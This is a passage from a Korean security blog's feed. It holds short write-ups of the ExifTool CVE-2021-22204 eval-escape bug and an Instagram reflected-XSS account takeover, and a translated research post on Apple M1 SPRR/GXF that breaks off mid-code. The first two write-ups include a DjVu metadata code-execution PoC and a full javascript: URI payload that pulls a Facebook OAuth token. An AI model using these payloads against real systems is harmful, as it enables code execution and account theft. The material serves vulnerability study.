    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">ExifTool CVE-2021-22204 - Arbitrary Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ExifTool </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>이미지 파일의 메타 데이터를 수정할 때 사용되는 ExifTool에서 임의 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>ExifTool은 perl 스크립트로 구현되었으며 취약점은 DjVu 파일을 파싱하는 <code>DjVu</code> 모듈의 <code>ParseAnt</code> 메서드에 존재합니다.</p><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">ParseAnt</span>($)</span><span class="hljs-function">...</span><span class="hljs-function">$<span class="hljs-title">tok</span> = &#x27;&#x27;</span>;  <span class="hljs-keyword">for</span> (;;) &#123;      <span class="hljs-comment"># get string up to the next quotation mark</span>      <span class="hljs-comment"># this doesn&#x27;t work in perl 5.6.2! grrrr</span>      <span class="hljs-comment"># last Tok unless $$dataPt =~ /(.*?)&quot;/sg;</span>      <span class="hljs-comment"># $tok .= $1;</span>      <span class="hljs-keyword">my</span> $pos = <span class="hljs-keyword">pos</span>($$dataPt);      <span class="hljs-keyword">last</span> Tok <span class="hljs-keyword">unless</span> $$dataPt =~ <span class="hljs-regexp">/&quot;/sg</span>;      $tok .= <span class="hljs-keyword">substr</span>($$dataPt, $pos, <span class="hljs-keyword">pos</span>($$dataPt)-<span class="hljs-number">1</span>-$pos);      <span class="hljs-comment"># we&#x27;re good unless quote was escaped by odd number of backslashes</span>      <span class="hljs-keyword">last</span> <span class="hljs-keyword">unless</span> $tok =~ <span class="hljs-regexp">/(\\\\+)$/</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">length</span>($1) &amp; <span class="hljs-number">0x01</span>;      $tok .= <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-comment"># quote is part of the string</span>  &#125;  <span class="hljs-comment"># must protect unescaped &quot;$&quot; and &quot;@&quot; symbols, and &quot;\\&quot; at end of string</span>  $tok =~ <span class="hljs-keyword">s</span>&#123;\\\\(.)|([\\$\\@]|\\\\$)&#125;&#123;<span class="hljs-string">&#x27;\\\\&#x27;</span>.($2 || $1)&#125;sge;  <span class="hljs-comment"># convert C escape sequences (allowed in quoted text)</span>  $tok = <span class="hljs-keyword">eval</span> <span class="hljs-string">qq&#123;&quot;$tok&quot;&#125;</span>;...</code></pre><p>위 코드는 C와 유사한 escape sequence를 구현한 코드로 <code>$tok</code> 변수의 특수 문자를 escape 처리한 뒤 이를 <code>eval</code> 함수에 전달합니다.</p><p>그러나 정규식 <code>tok =~ /(\\\\+)$/</code> 에서 <code>$</code>가 문자열의 끝과 개행을 의미해 백 슬래시와 개행 문자를 쓰면 문자열이 끝난 것으로 인식하고 개행 이후에 오는 특수 문자를 처리하지 않습니다. 따라서 <code>return data;</code> 코드를 실행하는 아래 PoC와 같이 <code>eval</code> 함수를 벗어나 임의 코드를 실행할 수 있습니다.</p><pre><code class="hljs python">(metadata    (Author <span class="hljs-string">&quot;\\</span><span class="hljs-string">&quot;</span> . <span class="hljs-keyword">return</span> `date`; <span class="hljs-comment">#&quot;)</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>escape sequence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Reflected XSS를 통한 인스타그램 계정 탈취</title>
    <link href="/2021/05/17/idioth/2021-05-17/"/>
    <url>/2021/05/17/idioth/2021-05-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=695">One-click reflected XSS in www.instagram.com due to unfiltered URI schemes leads to account takeover</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="http://www.instagram.com/">www.instagram.com</a> 데스크톱 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>데스크톱 버전의 <a href="http://www.instagram.com/">www.instagram.com</a> 에서 필터링 되지 않은 URI 스키마를 통해 사용자가 탭을 열거나 닫는데 사용되는 마우스의 가운데 버튼을 클릭할 시 reflected XSS가 발생하는 취약점이 발견되었습니다.</p><p>해당 취약점은 취약한 엔드 포인트로 전달된 파라미터 내부의 페이로드가 <code>href</code> 속성의 html <code>a</code> 태그 내부에 반영되어 발생합니다. 페이로드는 <a href="http://www.instagram.com/">www.instagram.com</a> 에서 해커의 자바스크립트 코드를 실행하는 자바스크립트 URI 스키마이며 공격이 실패하더라도 이벤트 핸들러가 URL을 다른 포맷으로 변경합니다. 또한 사용자가 새로운 탭에서 URL을 열기 위해 마우스 가운데 버튼을 클릭하거나 왼쪽과 오른쪽을 동시에 누르는 경우에 XSS와 계정 탈취가 가능합니다. 새 탭에서 열 경우 URL을 변경하는 자바스크립트 코드를 우회하여 공격에 성공할 수 있습니다.</p><p>사용자가 <code>https://www.instagram.com/accounts/recovery/landing/?token=true&amp;next=javascript:fetch(“https://www.facebook.com/x/oauth/status?client_id=124024574287414&amp;input_token&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fwww.instagram.com%2F&amp;sdk=joey&amp;wants_cookie_data=true“,&#123;mode:”cors”,credentials:”include”&#125;).then(function(a)&#123;alert(a.headers.get(“fb-ar”));console.log(a.headers.get(“fb-ar”));&#125;);</code> 링크에 접속할 경우 <code>/x/oauth/status</code> 페이스북 OAuth 엔드 포인트로부터 페이스북 액세스 토큰을 요청합니다. 액세스 토큰은 인스타그램 애플리케이션의 컨텍스트에서 생성되고 해당 액세스 토큰을 통해 페이스북 계정을 탈취할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>instagram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] 애플 실리콘 하드웨어의 비밀: SPRR과 Guarded Exception Levels (GXF)</title>
    <link href="/2021/05/16/idioth/apple_silicon_sprr_gxf/"/>
    <url>/2021/05/16/idioth/apple_silicon_sprr_gxf/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요. idioth입니다. ghidra로 악성코드 분석을 해온다는 녀석이 왜 글은 안 올리고 번역글을 쓰고 있냐고요? 사연이 있습니다. 본래 오늘 해당 글이 올라갔어야 했는데, 분석은 끝냈으나 이번 주 제가 아팠어서 어제 출근을 하였으나 계속되는 기침으로 인해 쫓겨났습니다.</p><p>여기서 제가 닉값을 해버렸죠. 크롬 원격 데스크톱을 설치해놓고 절전 설정을 안 건드려놔서 접근이 안됩니다.</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled.png"></p><p>어제 설정하고 지하철 타고 집에 오니 이렇게 되있네요. 아</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled%201.png"></p><p>얼른 집 컴퓨터를 업글을 해서 VM을 집 컴으로 돌리던가 해야겠어요… 요즘 같은 시국에 아프면 집에서 공부를 해야 하니까요! 아무튼 ㅜㅜ… ARM을 공부해볼까 하던 와중에 맥북 M1 칩이 등장하였고 그에 관련된 자료들이 눈에 보이면 잡지 읽는 느낌으로 읽곤 합니다. <del>사람 놀릴만한 버그는 없는지… 동생이 m1 에어를 쓰거든요.</del> ARM 아키텍처로 넘어오면서 스마트폰 등에 적용되어 있던 보호 기법들이 얼마나 들어올까?라는 궁금증이 있었는데, 이번 글이 동작 방식에 대해 어느 정도 의문을 해결해줄 거라 생각합니다!</p><p>번역에는 의역과 오역이 존재할 수 있습니다. 틀린 부분이나 이해하기 힘든 부분이 있다면 코멘트 달아주시면 감사드립니다.</p><blockquote><p>원문 글 : <a href="https://blog.svenpeter.dev/posts/m1_sprr_gxf/">Apple Silicon Hardware Secrets: SPRR and Guarded Exception Levels (GXF)</a></p></blockquote><h1 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h1><p>1년 전에 <a href="https://twitter.com/s1guza">siguza</a>는 페이지 테이블의 권한을 재정의하고 커널의 일부를 보호하는 커스텀 ARM extension <a href="https://siguza.github.io/APRR/">Apple APRR에 관한 write-up</a>을 작성했다. 이후 애플이 출시한 M1 칩은 업데이트된 APRR 뿐만 아니라 부팅 직후 베어 메탈 코드를 쉽게 실행할 수 있다. 새 버전에 대한 루머가 있지만 공식적인 자료는 아직 없다.</p><p>이 게시글의 첫 부분은 aarch64의 메모리 관리, 페이지 테이블, 유저/커널 모드에 대해 간략하게 소개하며 이전 Apple SoC와 같은 기능인 APRR도 요악한다. 이미 알고 있는 내용이라면 넘어가도 좋다.</p><p>위의 내용을 다루고 나서 SPRR과 GXF가 어떻게 작동하는지 다룬다. SPRR과 GXF가 무엇인지만 알고 싶으면 Asahi Linux 위키를 참고하면 된다.</p><h2 id="MMUs-pagetables-and-kernels"><a href="#MMUs-pagetables-and-kernels" class="headerlink" title="MMUs, pagetables, and kernels"></a>MMUs, pagetables, and kernels</h2><p>ARM CPU는 x86의 ring과 같은 <a href="https://developer.arm.com/documentation/102412/0100/Privilege-and-Exception-levels">exception levels</a>에서 실행된다. EL0은 애플리케이션이 실행되는 userspace이며 EL1은 커널이 실행되고 EL2는 하이퍼바이저가 실행된다. (펌웨어를 위한 EL3는 M1 칩에는 없다.)</p><p><a href="https://developer.arm.com/documentation/102142/latest/Virtualization-Host-Extensions">Virtualization Host Extensions</a>이 있는 ARM64 CPU는 EL2를 EL1처럼 만들어 커널을 쉽게 실행할 수 있다.</p><p>커널의 작업 중 하나는 유저 랜드에서 실행되는 각 애플리케이션에 종속되어 애플리케이션의 주소 공간을 알리는 것이다. 이는 Memory Management Unit이 수행한다. MMU는 가상 주소를 통해 실제 물리 주소를 관리할 수 있다. 이 매핑의 가장 작은 단위를 4 KiB 크기의 페이지라 하며 페이지에는 가장 주소와 실제 주소가 있다. 애플리케이션이나 커널이 <code>x</code> 위치의 메모리에 접근하려 하면 MMU는 페이지 테이블에서 페이지를 확인하고 <code>y</code> 주소에서 메모리를 반환한다. 커널은 유저 랜드 애플리케이션의 각 프로세스에 대해 다른 페이지 테이블 세트를 생성하여 별도의 주소 공간을 제공한다.</p><p>이 매핑 외에도 각 페이지는 특정 액세스 플래그를 인코딩하는 4 비트가 존재한다. 이 플래그는 페이지의 읽기 쓰기 권한이나 유저 랜드 애플리케이션 혹은 커널이 페이지에서 코드를 실행할 수 있는지를 결정한다. ARMv8-A CPU의 각 페이지 테이블 항목에서 4 비트를 찾을 수 있다.</p><ul><li><em>UXN</em>, Unprivileged Execute never: 이 페이지에서 유저 랜드 (EL0) 코드를 실행할 수 없음</li><li><em>PXN</em>, Prvileged excute never: 이 페이지에서 커널 (EL1) 코드를 실행할 수 없음</li><li><em>AP0</em> and <em>AP1</em>:  커널과 유저 랜드에 <code>rw/--</code>, <code>rw/rw</code>, <code>r-/--</code>, <code>r-/r-</code>  읽기, 쓰기 접근 권한을 인코딩</li></ul><p>마지막 액세스 플래그를 결정하는데 추가적인 복잡함(PAN, 계층 제어)이 있지만 이 게시글에서는 다루지 않는다. 유저 랜드와 커널의 권한이 연관이 있다는 점을 주의해야 한다. 유저랜드는 <code>rw</code>이지만 커널에는 <code>r-</code>로 페이지를 설정하는 것은 불가능하다.</p><h2 id="APRR"><a href="#APRR" class="headerlink" title="APRR"></a>APRR</h2><p>각 페이지에는 EL0/1(유저/커널 모드)에 대한 접근 권한(읽기/쓰기/실행)을 제어하는 4개의 플래그가 있다. APRR은 페이지 테이블 엔트리에 4개의 플래그를 저장하는 것 대신에 별도의 테이블에 대한 인덱스로 변경한다.(액세스 권한을 직접 인코딩하는 대신 4비트 index [AP1][AP0]PXN][UXN]으로 병합된다.) 이 별도의 테이블은 페이지의 실제 권한을 인코딩한다. 게다가 일부 레지스터는 userspace의 이러한 권한을 추가로 제한할 수 있다. 이러한 레지스터들은 커널과 유저 랜드에서 분리되어 있고 페이지 권한을 만들 때 유연성을 제공한다.</p><p>보통 모든 개별 엔트리를 수정하려면 많은 page walk가 필요하지만, APRR은 이러한 방식으로 페이지 테이블 권한에 대한 간접적인 계층을 도입하여 단일 레지스터 쓰기로 많은 페이지 권한을 효율적으로 수정할 수 있다.</p><p>더 자세한 사항은 <a href="https://siguza.github.io/APRR/">siguza의 write-up</a>에서 확인할 수 있다.</p><h2 id="Just-In-Time-컴파일러"><a href="#Just-In-Time-컴파일러" class="headerlink" title="Just-In-Time 컴파일러"></a>Just-In-Time 컴파일러</h2><p>보통 애플리케이션은 고수준 언어에서 기계 코드로 컴파일된 후 배포된다. 코드는 런타임 중에 수정되지 않아 <code>r-x</code>로 매핑할 수 있다.</p><p>하지만 JIT 컴파일러는 동적으로 기계 코드를 생성하므로 이를 위해 새 코드를 작성한 후 실행할 수 있도록 메모리 영역을 <code>rwx</code>로 매핑해야 한다.</p><p>애플은 아이폰에서 CPU가 보증된 명령만 실행하길 원했으므로 이런 매핑을 원하지 않았다. 모든 애플리케이션이 <code>rxw</code> 매핑을 요청하면 해당 애플리케이션이 원하는 명령을 실행할 수 있으므로 전체적인 보호 동작이 무의미해진다. 일부 애플리케이션만 이러한 매핑 권한이 있어도 <code>rxw</code> 매핑에 shellcode를 작성하여 악용의 대상이 될 수 있다.(<code>rxw</code> 영역을 찾아 arbitrary write 후 jump gadget을 찾는 것은 어렵겠지만)</p><p>하지만 자바스크립트가 있으므로 애플은 JIT 컴파일러가 필요하다.</p><p>이 문제는 APRR로 해결할 수 있다. 특정 유저 랜드 애플리케이션(iOS의 사파리, macOS의 모든 애플리케이션)은 <code>rw-</code>와 <code>r-x</code>를 빠르게 전환할 수 있는 특수 메모리 영역(<code>[MAP_JIT</code> 플래그를 통한 <code>mmap</code>, <code>pthread_jit_write_protect_np</code>](<a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))%EC%9D%84">https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))을</a> 요청할 수 있다. 여기서 APRR 레지스터 내부의 2 비트를 수정하여 JIT 페이지에 <code>w</code> 대신 <code>x</code>를 제거하여 모든 페이지를 <code>rw-</code>에서 <code>r-x</code>로 수정한다.(혹은 그 반대로 동작)</p><h2 id="페이지-보호-계층-Page-Protection-Layer"><a href="#페이지-보호-계층-Page-Protection-Layer" class="headerlink" title="페이지 보호 계층(Page Protection Layer)"></a>페이지 보호 계층(Page Protection Layer)</h2><p>애플은 가능한 한 모든 실행 가능한 페이지에 code signing을 요구한다. iOS에서는 애플에서 이 서명을 가져와야 하고 macOS에서는 로컬로 생성할 수 있는 ad-hoc(임시) 서명이 있다. Code signing은 보통 커널에 의해 시행된다. 커널은 디바이스 드라이버 같은 코드를 많이 가지고 있으므로 attack surface가 굉장히 크다. 모든 드라이버의 모든 버그는 code signing을 우회할 수 있다. 이러한 이슈는 오래전 비디오 게임 콘솔 <a href="https://free60project.github.io/wiki/Hypervisor/">마이크로소프트 Xbox 360 하이퍼바이저</a>에서 해결되었다. 모든 커널 코드에 exploitable 한 버그가 존재하는지 확인하는 대신에 하이퍼바이저 자체에 버그가 있는지만 확인하면 된다.</p><p>비슷하게 애플은 커널 내부에 매우 낮은 오버헤드를 가진 하이퍼바이저를 생성하기 위해 APRR을 사용한다. 첫 번째로 페이지 테이블(중요한 데이터 구조를 가진 메모리)과 권한 코드 섹션 PPL을 커널 자체에 읽기 전용으로 매핑한다. <a href="https://ko.wikipedia.org/wiki/%ED%8A%B8%EB%9E%A8%ED%8E%84%EB%A6%B0_(%EC%BB%B4%ED%93%A8%ED%8C%85)">trampoline</a> 함수는 APRR을 사용하여 페이지 테이블을 <code>rw-</code>로 다시 매핑하고 PPL 코드를 <code>r-x</code>로 매핑한 후 점프한다. 이 trampoline 함수는 PPL 코드의 유일한 엔트리 포인트이므로 hypercall 명령어처럼 동작하며 PPL 자체는 오버 헤드가 매우 낮은 하이퍼바이저처럼 동작한다.</p><p>상세한 내용은 <a href="http://newosxbook.com/articles/CasaDePPL.html">Jonathan의 Casa De P(a)P(e)L write up</a>에서 확인할 수 있다.</p><h1 id="SPRR"><a href="#SPRR" class="headerlink" title="SPRR"></a>SPRR</h1><h2 id="Userland-JIT"><a href="#Userland-JIT" class="headerlink" title="Userland JIT"></a>Userland JIT</h2><p>애플 실리콘의 JIT은 <code>rw-</code>와 <code>r-x</code> 권한을 빠르게 전환하기 위해 특수한 영역을 할당받는다. 이전 SoC에서 APRR을 사용하여 시행되었다.</p><p><a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon">Just-in-Time 컴파일러에 대한 애플의 공식 문서</a>에서 M1에서 이러한 전환은 여전히 <code>_pthread_jit_write_protect_np</code> 함수가 수행함을 알 수 있다. <code>otool -xv /usr/lib/system/libsystem_pthread.dylib</code>을 통해 어떠한 동작을 하는지 확인해보자.</p><pre><code class="hljs apache"><span class="hljs-attribute">_pthread_jit_write_protect_np</span>:[...]<span class="hljs-attribute">0000000000007fdc</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xc<span class="hljs-number">118</span><span class="hljs-attribute">0000000000007fe0</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xffff, lsl #<span class="hljs-number">16</span><span class="hljs-attribute">0000000000007fe4</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xf, lsl #<span class="hljs-number">32</span><span class="hljs-attribute">0000000000007fe8</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>, lsl #<span class="hljs-number">48</span><span class="hljs-attribute">0000000000007fec</span>        ldr     x<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]                ; Latency: 4</span><span class="hljs-meta">0000000000007ff0        msr     S3_6_C15_C1_5, x0</span><span class="hljs-meta">0000000000007ff4        isb</span><span class="hljs-meta">[...]</span></code></pre><p>주소 <code>0xffffc118</code>에서 64비트 정수를 로드한 후 <code>s3_6_c15_c1_5</code> 시스템 레지스터에 작성한다. <code>0xffffc110</code>에서 새로운 시스템 레지스터 값을 로드하는 비슷한 코드가 더 있다. 이 주소들은 모든 유저 랜드 프로세스에 매핑되고 커널이 유저 랜드에 전달하는 많은 변수를 포함한 commpage 영역이다.</p><p>오픈 소스 XNU 코드에는 commpage 내부에 이 변수들을 설정하는 코드가 없지만 이전 세대 APRR에 사용된 <code>cp_aprr_shadow_jit_rw</code>에 대한 참조 코드가 남아있다.</p><p>이 C 프로그램을 덤프 해보자</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">uint64_t</span> *sprr = (<span class="hljs-keyword">uint64_t</span> *)<span class="hljs-number">0xfffffc110</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx %llx\n&quot;</span>, sprr[<span class="hljs-number">0</span>], sprr[<span class="hljs-number">1</span>]);&#125;</code></pre><p><code>0x2010000030300000</code>과 <code>0x2010000030100000</code> 값을 통해 JIT 페이지의 <code>r-x</code>와 <code>rw-</code> 권한을 전환한다. 이는 APRR과 유사하지만 다른 레지스터를 사용하며 다른 magic number를 포함한다.</p><p>SPRR에 대한 대략적인 아이디어를 통해 커널을 disassemble 하고 이 레지스터나 근처 레지스터를 사용하는 함수를 찾을 수 있다.</p><p>우리가 찾은 레지스터에서 비트를 수정하고 어떻게 작동하는지 확인하자. M1에서 실행되는 일반 유저 랜드 프로그램에서도 가능하다.</p><p>모든 비트를 0과 1로 설정</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) &#123;        write_sprr(<span class="hljs-number">1U</span>LL&lt;&lt;i);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bit %02d: %016llx\n&quot;</span>, i, read_sprr());    &#125;</code></pre><p>commpage에서 찾은 두 값이 다른 두 비트를 제외한 모든 비트가 initial value로 잠겼다. 이를 통해 JIT 페이지 권한과 관련이 있음을 알 수 있다. <code>mmap</code>을 사용하여 페이지를 매핑할 수 있다. 읽기나 쓰기가 보호된 페이지를 읽거나 쓰면 <code>SIGBUS</code>가 발생하고 실행 권한이 없는 페이지로 점프하면 <code>SIGSEV</code>가 발생한다. signal handler를 통해 유저 랜드 애플리케이션에서 이러한 signal을 확인할 수 있다.</p><p>보호된 페이지에 접근하기 위해 <code>x0</code>을 magic constant로 설정한 signal handler를 설정하고 return 되기 전에 프로그램 카운터를 증가시킨다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;</code></pre><p>실행 권한이 없는 페이지를 실행하는 것도 비슷한 방법으로 하면 된다. 프로그램 카운터를 링크 레지스터로 설정하고 callee로 돌아가 magic value를 <code>x0</code>에 저장한다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;</code></pre><p>이제 <code>MAP_JIT</code>으로 페이지를 매핑하고 시스템 레지스터에 모든 4개의 가능한 값을 메모리 읽기 혹은 쓰기를 실행한다.</p><ul><li><p>SPRR JIT test code</p>  <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _XOPEN_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/utsname.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ucontext.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;ldr x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;str x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr + <span class="hljs-number">8</span>)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span 